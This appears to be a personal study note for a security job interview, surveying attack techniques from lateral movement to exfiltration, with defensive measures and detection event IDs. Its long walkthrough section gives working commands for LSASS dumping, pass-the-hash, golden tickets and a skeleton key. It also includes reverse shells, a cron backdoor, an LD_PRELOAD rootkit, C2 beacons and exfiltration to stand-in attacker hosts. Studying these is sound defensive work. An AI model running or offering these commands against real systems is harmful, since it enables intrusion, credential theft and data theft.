- Why attackers use it: Code runs whenever Word/Excel opens, often trusted by users.
- Detect: Monitor template paths (Normal.dotm, XLSTART), signed macros, AMSI/AV alerts on VBA.
- Example: Drop malicious Personal.xlsb in XLSTART so it runs VBA at every Excel launch.

notes.path: obsidian.main.vault/Job Interview Prep/Rapid7/Interview Prep/Technical/Fundamental Security Concepts.md
notes.content:
# Security Interview Study Guide: Core Attack Concepts

A concise reference covering fundamental attack techniques, real-world examples, and defensive measures.

---

# Core Attack Techniques

## 1. Lateral Movement

**What it is:** How attackers move from one compromised system to other systems within a network to reach higher-value targets or data.

**Why it matters:** Prevents a single compromised machine from becoming a company-wide breach.

**[[Fundamental Security Concepts 1|Common techniques]]:**
- Pass-the-Hash / Pass-the-Ticket with stolen credentials
- Remote services (RDP, SMB, WinRM, SSH)
- Exploiting trust relationships (shared admin accounts, AD misconfigurations)

**Windows Example:**
- Attacker phishes a user and gains access to their workstation
- They dump LSASS memory and extract NTLM hash for a domain admin account
- Using PsExec or WMI with the hash, they authenticate to a file server without needing the plaintext password
- From there, they pivot to a domain controller using the same credentials

**Linux Example:**
- Attacker compromises a web server and discovers SSH private keys in a developer's home directory
- The keys lack passphrases and have corresponding authorized_keys entries on multiple systems
- Using the stolen keys, they SSH to a database server, then to an internal GitLab instance
- They find cloud credentials in a CI/CD configuration file for further access

---

## 2. Privilege Escalation

**What it is:** Gaining higher access levels (e.g., standard user ‚Üí local admin ‚Üí domain admin).

**Why it matters:** Higher privileges allow attackers to disable defenses, access [[Fundamental Security Concepts 1|sensitive data]], and establish deeper footholds.

**Common techniques:**
- Exploiting unpatched vulnerabilities (kernel bugs, service misconfigurations)
- Abusing weak service permissions or [[Fundamental Security Concepts 1|scheduled tasks]]
- Credential harvesting from memory (LSASS) and token reuse
- Misconfigured sudoers or setuid binaries (Linux)

**Windows Example:**
- Attacker finds a service running as SYSTEM with weak file permissions using `accesschk.exe`
- The service binary is located in `C:\Program Files\VulnApp\service.exe` and is writable by the current user
- They replace the executable with a malicious payload that adds their account to the local Administrators group
- After restarting the service with `sc stop/start`, the payload executes as SYSTEM

**Linux Example:**
- Attacker discovers `/usr/bin/backup-script` has the setuid bit set and runs as root
- The script uses relative paths to call system commands (e.g., `tar` without full path)
- They modify their PATH environment variable to include a malicious directory first
- When they execute the setuid binary, it calls their malicious `tar` script instead, running commands as root

---

## 3. Persistence

**What it is:** Techniques to maintain access across reboots, password changes, or partial remediation efforts.

**Why it matters:** Without persistence, a simple reboot could evict the attacker.

**Common techniques:**
- **Autoruns:** Registry Run keys, Startup folders, Launch Agents/Daemons (macOS)
- Scheduled tasks / cron jobs
- Service installation or driver planting
- **Domain persistence:** Golden/Silver Tickets, rogue OAuth apps, AdminSDHolder manipulation
- **Living-off-the-land:** [[Fundamental Security Concepts 1|WMI event]] subscriptions

**Windows Example:**
- Attacker creates a [[Fundamental Security Concepts 1|scheduled task]] named "WindowsUpdateCheck" that appears legitimate
- Task runs as SYSTEM and executes every hour: `powershell.exe -NoP -W Hidden -Enc <base64_payload>`
- The payload beacons to C2 infrastructure and pulls down additional commands
- Alternatively, they create a WMI [[Fundamental Security Concepts 1|event subscription]] that triggers on user logon events

**Linux Example:**
- Attacker adds a cron job to the root crontab: `@reboot /usr/bin/.update-system > /dev/null 2>&1`
- The `.update-system` script is their reverse shell that connects back to C2
- They also add an SSH public key to `/root/.ssh/authorized_keys` for direct access
- For stealth, they modify `/etc/ld.so.preload` to load a rootkit library that hides processes and network connections

---

## 4. Command and Control (C2)

**What it is:** How compromised systems receive instructions and report back to the attacker.

**Why it matters:** Disrupting C2 breaks the attacker's ability to coordinate and advance their objectives.

**Common channels:**
- HTTP/HTTPS beacons to cloud or VPS infrastructure
- DNS tunneling (commands/data encoded in DNS queries)
- Legitimate platforms abused as relays (Slack, GitHub, Pastebin)
- Covert channels (TLS over non-standard ports, ICMP)

**Example:**
- Malware beacons every 5 minutes over HTTPS to a domain resembling a legitimate software update site, retrieves tasks, and exfiltrates results

---

## 5. Defense Evasion

**What it is:** Techniques to avoid detection by security tools and analysts.

**Why it matters:** Successful evasion extends attacker dwell time and increases impact.

**Common techniques:**
- Obfuscating scripts (PowerShell encoding, XOR encryption)
- Using signed binaries (LOLBins: rundll32, mshta, certutil)
- Disabling EDR/AV or tampering with logs
- Process masquerading and injection
- Timestomping and clearing event logs

**Example:**
- Running malicious code via Microsoft-signed rundll32.exe to blend in with legitimate system activity

---

## 6. Data Exfiltration

**What it is:** Stealing data from the network to an external location under attacker control.

**Why it matters:** Often the ultimate objective in breaches (IP theft, customer data, financial records).

**Common techniques:**
- Direct upload over HTTPS to attacker infrastructure or cloud storage
- Chunked exfiltration via DNS or ICMP to bypass egress controls
- Abusing legitimate sync tools (OneDrive, Dropbox, Box)
- Exfiltration via email or messaging APIs

**Example:**
- Attacker compresses and encrypts a database dump, then uploads it in small HTTPS chunks to an S3 bucket to evade volume-based alerts

---

## 7. Discovery & Credential Access

These reconnaissance and access techniques typically precede the core attack chain:

**Discovery:**
- Enumerating users, groups, systems, shares, and security controls
- Example: Using PowerView or native AD cmdlets to identify systems where domain admins are logged in

**[[Fundamental Security Concepts 1|Credential Access]]:**
- Stealing passwords, tokens, or hashes from memory or storage
- Example: Dumping LSASS memory to extract plaintext passwords and Kerberos tickets

---

## Typical Attack Flow

A realistic kill chain demonstrating how these techniques interconnect:

1. **Initial Access:** Phishing email delivers malware to a user's workstation
2. **Discovery:** Enumerate the network and Active Directory to identify high-value targets
3. **Credential Access:** Dump LSASS memory to harvest credentials
4. **[[Fundamental Security Concepts 1|Privilege Escalation]]:** Exploit vulnerable service to gain local SYSTEM privileges
5. **[[Fundamental Security Concepts 1|Lateral Movement]]:** Use stolen admin credentials to access file servers and domain controllers
6. **Persistence:** Install scheduled task and WMI event subscription
7. **Command & Control:** Establish HTTPS beacon to cloud-hosted C2 infrastructure
8. **Exfiltration:** Compress, encrypt, and upload sensitive files to attacker-controlled cloud storage

---

## Defensive Measures by Technique

### Lateral Movement
- Enforce least privilege and network segmentation
- Disable unnecessary remote protocols (RDP, SMB, WinRM)
- Implement PAM/JIT access controls
- Deploy unique local admin passwords (LAPS)

### Privilege Escalation
- Maintain aggressive patch cadence
- Harden service permissions and scheduled tasks
- Monitor for abnormal token usage and integrity level changes

### Persistence
- Audit autoruns, scheduled tasks, and service installations
- Monitor Active Directory for suspicious modifications
- Enforce MFA everywhere and review OAuth app grants regularly

### Command & Control
- Implement egress filtering and DNS monitoring
- Deploy SSL/TLS inspection where appropriate
- Monitor for beaconing patterns and anomalous traffic

### Defense Evasion
- Enable comprehensive logging (Sysmon, PowerShell Script Block Logging)
- Monitor for LOLBin abuse and unsigned script execution
- Implement EDR with tamper protection

### Data Exfiltration
- Deploy DLP solutions and egress controls
- Implement anomaly detection for large or unusual transfers
- Encrypt sensitive data at rest and in transit

---

## Detailed Technical Walkthrough

This section provides step-by-step technical details for educational purposes. Understanding these techniques is essential for security professionals to detect, prevent, and respond to real-world attacks.

### Scenario: Windows Domain Environment Compromise

#### Phase 1: Initial Access & Discovery

**Step 1: Initial Compromise**
```powershell
# Attacker sends phishing email with malicious macro
# Macro executes PowerShell to download and run Cobalt Strike beacon
powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64_encoded_payload>
```

**Step 2: Situational Awareness**
```powershell
# Check current privileges and context
whoami /all
net user %username% /domain
nltest /domain_trusts

# Identify security tools
Get-Process | Where-Object {$_.ProcessName -match 'defender|edr|crowdstrike|carbon'}
Get-Service | Where-Object {$_.DisplayName -match 'antivirus|edr|defender'}

# Enumerate the domain
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

**Step 3: Network Enumeration**
```powershell
# Using built-in tools (Living off the Land)
nltest /dclist:
net view /domain
arp -a
ipconfig /all

# PowerView for AD enumeration (if able to load)
Import-Module .\PowerView.ps1
Get-DomainComputer
Get-DomainUser -SPN  # Find Kerberoastable accounts
Find-LocalAdminAccess  # Where can we move?
Get-DomainGPOLocalGroup  # GPO-based admin assignments
```

#### Phase 2: Credential Access

**Step 4: Dump LSASS Memory**
```powershell
# Method 1: Using Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Method 2: Creating a process dump (less detected)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Method 3: Using ProcDump (Microsoft signed)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Step 5: Extract Credentials**
```powershell
# Parse the dump file offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Results might include:
# - NTLM hashes for Pass-the-Hash
# - Kerberos tickets for Pass-the-Ticket
# - Plaintext passwords (if WDigest enabled)
```

**Step 6: Kerberoasting (if needed)**
```powershell
# Request service tickets for accounts with SPNs
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"

# Export tickets
mimikatz.exe "kerberos::list /export" "exit"

# Crack offline with hashcat
hashcat -m 13100 tickets.txt wordlist.txt
```

#### Phase 3: Privilege Escalation

**Step 7: Local Privilege Escalation**
```powershell
# Check for unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *

# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit example: Weak service permissions
sc config VulnService binpath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Phase 4: Lateral Movement

**Step 8: Pass-the-Hash to Target System**
```powershell
# Using Impacket's psexec.py (from Linux)
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50

# Using Mimikatz for Pass-the-Ticket
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe"

# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --exec-method smbexec
```

**Step 9: WMI/WinRM for Lateral Movement**
```powershell
# WinRM (requires credentials or hash)
$cred = Get-Credential
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {whoami}

# WMI execution
wmic /node:192.168.1.50 /user:CORP\Administrator /password:Password123 process call create "cmd.exe /c powershell <command>"

# PSExec-style with built-in tools
sc \\192.168.1.50 create RemoteService binpath= "cmd.exe /c powershell <command>"
sc \\192.168.1.50 start RemoteService
```

#### Phase 5: Domain Dominance

**Step 10: DCSync Attack**
```powershell
# Once you have domain admin or replication rights
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# This extracts the krbtgt hash for Golden Ticket creation
```

**Step 11: Golden Ticket Creation**
```powershell
# Create ticket that grants access to entire domain
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /user:fakeadmin /ptt" "exit"

# Now you can access any resource as any user
dir \\DC01\C$
```

#### Phase 6: Persistence

**Step 12: Scheduled Task Persistence**
```powershell
# Create legitimate-looking scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Enc <base64>"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSystemMaintenance" -Action $action -Trigger $trigger -Principal $principal
```

**Step 13: WMI Event Subscription**
```powershell
# Create WMI event that survives reboots
$FilterArgs = @{name='WindowsUpdateFilter'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='WindowsUpdateConsumer'; CommandLineTemplate="powershell.exe -NoP -W Hidden -Enc <base64>"}
$Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{Filter = [Ref]$Filter; Consumer = [Ref]$Consumer}
New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

**Step 14: Domain Persistence - Skeleton Key**
```powershell
# Install Skeleton Key on Domain Controller (requires DC access)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Now any user can authenticate with password "mimikatz"
```

#### Phase 7: Command & Control

**Step 15: Establish Covert C2 Channel**
```powershell
# DNS tunneling beacon
while($true) {
    $cmd = (nslookup -type=txt beacon.attacker.com 8.8.8.8 | Select-String "text =").ToString().Split('"')[1]
    if($cmd) { 
        $result = Invoke-Expression $cmd | Out-String
        # Exfil result via chunked DNS queries
    }
    Start-Sleep 300
}

# HTTPS beacon (common C2 pattern)
while($true) {
    $tasks = Invoke-RestMethod -Uri "https://legitimate-looking-domain.com/api/updates" -Method GET
    $tasks | ForEach-Object { 
        $output = Invoke-Expression $_.command
        Invoke-RestMethod -Uri "https://legitimate-looking-domain.com/api/results" -Method POST -Body $output
    }
    Start-Sleep 300
}
```

#### Phase 8: Data Exfiltration

**Step 16: Locate and Stage Sensitive Data**
```powershell
# Search for sensitive files
Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match 'password|confidential|secret|finance'}

# Stage data
$compress = @{
    Path = "C:\SensitiveData\*"
    CompressionLevel = "Optimal"
    DestinationPath = "C:\temp\update.zip"
}
Compress-Archive @compress
```

**Step 17: Exfiltrate via HTTPS**
```powershell
# Split file into chunks to avoid detection
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\update.zip")
$chunkSize = 1MB
for($i=0; $i -lt $bytes.Length; $i+=$chunkSize) {
    $chunk = $bytes[$i..([Math]::Min($i+$chunkSize-1, $bytes.Length-1))]
    $base64 = [Convert]::ToBase64String($chunk)
    Invoke-RestMethod -Uri "https://attacker-cdn.com/upload" -Method POST -Body $base64
    Start-Sleep 60  # Slow and steady
}
```

### Scenario: Linux Server Compromise

#### Phase 1: Initial Access

**Step 1: Web Application Exploitation**
```bash
# Exploiting vulnerable web app (e.g., command injection)
curl "http://target.com/search?q=test;whoami"
curl "http://target.com/search?q=test;bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"

# Listener on attacker machine
nc -lvnp 4444
```

**Step 2: Upgrade Shell & Situational Awareness**
```bash
# Upgrade to interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Enumerate system
id
uname -a
cat /etc/os-release
sudo -l
```

#### Phase 2: Privilege Escalation

**Step 3: Search for Privesc Vectors**
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# Look for writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w {} && echo {}'

# Check for capabilities
getcap -r / 2>/dev/null

# Enumeration script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Step 4: Exploit SUID Binary**
```bash
# Example: vim has SUID bit set
/usr/bin/vim -c ':!/bin/bash'

# Example: Exploiting PATH manipulation
echo '#!/bin/bash
bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /usr/bin/backup-script  # This calls 'tar' without full path
```

#### Phase 3: Persistence

**Step 5: SSH Key Persistence**
```bash
# Generate SSH key pair
ssh-keygen -t rsa -f /tmp/key -N ""

# Add public key to root's authorized_keys
mkdir -p /root/.ssh
cat /tmp/key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Copy private key to attacker machine for later use
cat /tmp/key  # Copy this
```

**Step 6: Cron Job Backdoor**
```bash
# Add to root crontab
echo '@reboot /usr/local/bin/.system-update > /dev/null 2>&1' >> /var/spool/cron/crontabs/root

# Create the backdoor script
cat > /usr/local/bin/.system-update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.5/443 0>&1
EOF
chmod +x /usr/local/bin/.system-update
```

**Step 7: Library Preload Rootkit**
```bash
# Simple LD_PRELOAD rootkit to hide processes
cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

struct dirent *(*old_readdir)(DIR *);

struct dirent *readdir(DIR *dir) {
    struct dirent *entry;
    old_readdir = dlsym(RTLD_NEXT, "readdir");
    while ((entry = old_readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "malicious") == NULL)
            return entry;
    }
    return NULL;
}
EOF

gcc -shared -fPIC /tmp/hide.c -o /lib/x86_64-linux-gnu/.libc-hidden.so -ldl
echo "/lib/x86_64-linux-gnu/.libc-hidden.so" >> /etc/ld.so.preload
```

#### Phase 4: Lateral Movement

**Step 8: SSH Key Harvesting**
```bash
# Search for SSH private keys
find / -name id_rsa 2>/dev/null
find / -name id_ed25519 2>/dev/null
find /home -name authorized_keys 2>/dev/null

# Check for keys without passphrases
for key in $(find /home -name id_rsa); do
    echo "Testing $key"
    ssh -i $key -o PasswordAuthentication=no localhost whoami 2>/dev/null && echo "No passphrase: $key"
done
```

**Step 9: Use Stolen Keys**
```bash
# Copy key to attacker machine
cat /home/devuser/.ssh/id_rsa

# On attacker machine
chmod 600 stolen_key
ssh -i stolen_key devuser@192.168.1.100

# Check where this key works
for ip in $(seq 1 254); do
    ssh -i stolen_key -o ConnectTimeout=2 -o PasswordAuthentication=no devuser@192.168.1.$ip whoami 2>/dev/null && echo "Access: 192.168.1.$ip"
done
```

#### Phase 5: Credential Harvesting

**Step 10: Search for Credentials**
```bash
# Look for plaintext credentials
grep -r "password" /var/www/html 2>/dev/null
grep -r "PASS\|PASSWORD\|SECRET" /opt 2>/dev/null
find /home -name "*.conf" -exec grep -l "password" {} \;

# Check common locations
cat /var/www/html/config.php
cat /opt/app/.env
cat ~/.bash_history
cat ~/.mysql_history

# Database connection strings
find / -name "database.yml" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
```

**Step 11: Memory Dumping (if applicable)**
```bash
# Dump process memory (requires root)
gcore <pid_of_interesting_process>
strings core.<pid> | grep -i "password\|token\|key"

# Extract from running process
cat /proc/<pid>/environ | tr '\0' '\n'
```

#### Phase 6: Exfiltration

**Step 12: Data Staging and Compression**
```bash
# Find and stage sensitive data
find /home /var/www /opt -type f \( -name "*.sql" -o -name "*.db" -o -name "*backup*" \) -exec cp {} /tmp/.stage/ \; 2>/dev/null

# Compress with password
tar czf - /tmp/.stage | openssl enc -aes-256-cbc -salt -out /tmp/update.tar.gz.enc -pass pass:SecretKey123
```

**Step 13: Exfiltrate Data**
```bash
# Method 1: HTTPS POST
curl -X POST -F "file=@/tmp/update.tar.gz.enc" https://attacker-server.com/upload

# Method 2: DNS exfiltration (for very restricted environments)
xxd -p /tmp/data | fold -w 32 | while read line; do
    dig $line.exfil.attacker.com @attacker-dns-server
done

# Method 3: ICMP tunneling
# Using ptunnel or similar tool
```

### Detection Considerations

**What defenders would see:**
- Event ID 4688 (Process Creation) with suspicious command lines
- Event ID 4624 (Logon) Type 3 from unusual sources
- Event ID 4672 (Special Privileges Assigned)
- Unusual LSASS access attempts
- Scheduled task creation by non-admin users
- Kerberos TGS-REQ without prior TGT
- Unusual network connections or DNS patterns
- Large outbound data transfers

**Key detection opportunities:**
- Monitoring for LSASS dumps ([[Fundamental Security Concepts 1|Sysmon Event]] ID 10)
- Detecting credential dumping tools (Sysmon Event ID 1, process creation)
- Tracking lateral movement via RPC/SMB (Sysmon Event ID 3, network connections)
- Monitoring scheduled task creation (Event ID 4698)
- Detecting DCSync by monitoring replication requests from non-DC systems
- Tracking WMI event subscriptions (Sysmon Event ID 19-21)

---

## Additional Resources

These concepts map directly to the **MITRE ATT&CK framework**. For hands-on practice, consider lab environments using tools like:
- **Reconnaissance:** BloodHound, PowerView, SharpHound
- **Exploitation:** Impacket, Metasploit, CrackMapExec
- **Credential Access:** Mimikatz, LaZagne, Rubeus
- **C2 Frameworks:** Sliver, Havoc, Mythic (open-source alternatives)
